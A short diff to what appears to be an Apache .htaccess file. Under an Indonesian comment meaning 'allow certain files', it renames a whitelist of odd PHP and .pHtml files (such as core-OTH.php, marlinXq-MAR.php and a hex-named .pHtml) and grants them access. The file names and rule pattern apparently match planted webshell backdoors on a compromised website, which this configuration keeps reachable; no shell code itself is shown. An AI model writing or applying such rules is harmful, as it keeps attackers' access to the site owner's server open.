@@ -10,7 +10,7 @@ Require all granted
 </FilesMatch>
 
 # Izinkan file tertentu
-<FilesMatch '^(core-OTH.php|core-MAR.php|696fd53d4753a.pHtml|indextol-OTH.php|indextol-MAR.php|marlinXq-OTH.php|marlinXq-MAR.php)$'>
+<FilesMatch '^(cores-OTH.php|cores-MAR.php|696fd53d4753as.pHtml|indextols-OTH.php|indextols-MAR.php|marlinXqs-OTH.php|marlinXqs-MAR.php)$'>
 Require all granted
 </FilesMatch>
 
